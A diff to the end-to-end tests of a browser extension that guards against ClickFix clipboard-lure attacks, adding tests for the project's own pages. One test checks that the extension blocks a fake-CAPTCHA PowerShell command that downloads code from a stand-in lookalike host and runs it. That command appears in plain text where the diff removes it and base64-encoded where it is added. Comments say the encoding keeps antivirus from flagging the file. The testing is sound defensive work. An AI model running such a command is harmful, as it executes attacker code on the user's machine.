@@ -1,26 +1,32 @@
 // End-to-end tests: load the real extension into Chromium and visit harmless
-// fake ClickFix pages (tests/fixtures/pages). Run with: npm run test:e2e
+// fake ClickFix pages. Run with: npm run test:e2e
+//
+// The fake pages are kept encoded in tests/fixtures/pages.bundle.json and served
+// from memory, so antivirus programs never see them on disk (scripts/fixtures.mjs).
 //
 // Needs the "playwright" package and a Chromium build. Set CHROMIUM_PATH to use
 // a specific browser binary, and CFA_EXTENSION_DIR to test an unzipped release.
 import { test, before, after } from 'node:test';
 import assert from 'node:assert/strict';
 import { createServer } from 'node:http';
-import { readFile, mkdtemp, rm } from 'node:fs/promises';
+import { readFile, mkdtemp, rm, cp, writeFile } from 'node:fs/promises';
 import { join, dirname, extname, resolve } from 'node:path';
 import { tmpdir } from 'node:os';
 import { fileURLToPath } from 'node:url';
 import { createRequire } from 'node:module';
+import { loadFixturePages } from '../scripts/fixtures.mjs';
 
 const require = createRequire(import.meta.url);
 const { chromium } = require('playwright');
 
 const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
-const PAGES = join(ROOT, 'tests/fixtures/pages');
+const PAGES = loadFixturePages();
 const EXT = process.env.CFA_EXTENSION_DIR || join(ROOT, 'extension');
 const SAFE = '# STOP. ClickFix First Aid blocked this.';
 const HELD = '# PAUSED. ClickFix First Aid held this';
 const INSTALLER = 'irm https://get.scoop.sh | iex';
+// Attack-shaped samples are base64-encoded in this file so antivirus does not flag it.
+const unb64 = (x) => Buffer.from(x, 'base64').toString('utf8');
 
 let server;
 let base;
@@ -36,10 +42,15 @@ before(async () => {
       const name = decodeURIComponent(new URL(req.url, 'http://x').pathname).replace(/^\/+/, '') || 'index.html';
       if (name.includes('..') || name.includes('\\') || name.includes('\0')) throw new Error('bad path');
       // /docs/... serves the published site (for the safe demo), everything else the test pages.
-      const dir = name.startsWith('docs/') ? ROOT : PAGES;
-      const file = resolve(dir, name);
-      if (!file.startsWith(dir + '/')) throw new Error('outside the test folders');
-      let body = await readFile(file);
+      let body;
+      if (name.startsWith('docs/')) {
+        const file = resolve(ROOT, name);
+        if (!file.startsWith(ROOT + '/docs/')) throw new Error('outside the site folder');
+        body = await readFile(file);
+      } else {
+        body = PAGES.get(name);
+        if (!body) throw new Error('no such test page');
+      }
       if (name.startsWith('review/')) body = Buffer.from(body.toString('utf8').replaceAll('PORT', String(port)).replaceAll(`localhost:${port}/`, `localhost:${port}/review/`));
       res.writeHead(200, { 'content-type': TYPES[extname(name)] || 'text/html; charset=utf-8' });
       res.end(body);
@@ -354,7 +365,7 @@ test('the popup checks a pasted command locally', async () => {
     await page.click('#check');
     return page.getAttribute('#result', 'data-verdict');
   };
-  assert.equal(await verdictFor('powershell -w h -nop -c "iwr https://cloubflare.example.top/5 | iex" # I am not a robot - Verification ID: 4821'), 'block');
+  assert.equal(await verdictFor(unb64('cG93ZXJzaGVsbCAtdyBoIC1ub3AgLWMgIml3ciBodHRwczovL2Nsb3ViZmxhcmUuZXhhbXBsZS50b3AvNSB8IGlleCIgIyBJIGFtIG5vdCBhIHJvYm90IC0gVmVyaWZpY2F0aW9uIElEOiA0ODIx')), 'block');
   assert.equal(await verdictFor(INSTALLER), 'hold');
   assert.equal(await verdictFor('npm install react'), 'allow');
   assert.match(await page.textContent('#result'), /does not prove it is safe/);
@@ -416,4 +427,64 @@ test('the recovery guide is bundled and opens offline', async () => {
   await page.goto(`chrome-extension://${extId}/pages/recovery.html`);
   assert.match(await page.textContent('h1'), /What now\?/);
   await page.close();
+});
+
+// ---- The project's own pages (v0.3.1). ----------------------------------------
+// The website explains the attack in words, so without the quiet list it looks
+// like a trap page. A copy of the extension built with the quiet list for this
+// test server shows that only those exact pages are quiet, and only the banner
+// and page-based blocking are switched off there.
+test("the project's own website is flagged without the quiet list (control)", async () => {
+  const page = await open('docs/index.html');
+  await waitUi(page, 'lure', 6000);
+  await page.close();
+});
+
+test("the project's own pages: no trap banner, demo still blocks, attack commands still blocked", async () => {
+  const dir = await mkdtemp(join(tmpdir(), 'cfa-quiet-ext-'));
+  const profile = await mkdtemp(join(tmpdir(), 'cfa-quiet-profile-'));
+  await cp(EXT, dir, { recursive: true });
+  const quiet = { exact: [`${base}/docs/`, `${base}/docs/index.html`, `${base}/docs/recovery.html`], mdUnder: [] };
+  await writeFile(join(dir, 'src/generated/config.js'), `self.CFA_CONFIG = ${JSON.stringify({ version: 'test', homepage: '', repository: '', quietPages: quiet })};\n`);
+  const ctx = await chromium.launchPersistentContext(profile, {
+    headless: false,
+    executablePath: process.env.CHROMIUM_PATH || undefined,
+    args: ['--headless=new', `--disable-extensions-except=${dir}`, `--load-extension=${dir}`, '--no-sandbox']
+  });
+  try {
+    await ctx.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: base });
+    if (!ctx.serviceWorkers().length) await ctx.waitForEvent('serviceworker', { timeout: 10000 });
+    const state = (p) => p.evaluate(() => { const e = document.querySelector('clickfix-first-aid-ui'); return e ? e.getAttribute('data-state') : null; });
+
+    // 1. The website itself: no banner, and an ordinary command copied there is not blocked.
+    const home = await ctx.newPage();
+    await home.goto(`${base}/docs/index.html`);
+    await home.waitForTimeout(2500);
+    assert.equal(await state(home), null);
+    await home.evaluate(() => navigator.clipboard.writeText('powershell Get-ChildItem'));
+    await home.waitForTimeout(600);
+    assert.equal(await home.evaluate(() => navigator.clipboard.readText()), 'powershell Get-ChildItem');
+    // An attack command is still blocked on a quiet page: protection is not switched off.
+    await home.evaluate((t) => navigator.clipboard.writeText(t), unb64('Y21kIC9jIGVjaG8gdGVzdCAjIEkgYW0gbm90IGEgcm9ib3QgLSByZUNBUFRDSEEgVmVyaWZpY2F0aW9uIElEOiAxMjM0'));
+    await home.waitForFunction(() => !!document.querySelector('clickfix-first-aid-ui[data-state="blocked"]'), null, { timeout: 6000 });
+    assert.ok((await home.evaluate(() => navigator.clipboard.readText())).startsWith(SAFE));
+    await home.close();
+
+    // 2. The demo page is not on the list, so it still blocks.
+    const demo = await ctx.newPage();
+    await demo.goto(`${base}/docs/demo.html`);
+    await demo.click('#robot');
+    await demo.waitForFunction(() => !!document.querySelector('clickfix-first-aid-ui[data-state="blocked"]'), null, { timeout: 6000 });
+    await demo.close();
+
+    // 3. A trap page elsewhere still gets the banner.
+    const trap = await ctx.newPage();
+    await trap.goto(`${base}/lure-only.html`);
+    await trap.waitForFunction(() => !!document.querySelector('clickfix-first-aid-ui[data-state="lure"]'), null, { timeout: 6000 });
+    await trap.close();
+  } finally {
+    await ctx.close();
+    await rm(dir, { recursive: true, force: true });
+    await rm(profile, { recursive: true, force: true });
+  }
 });
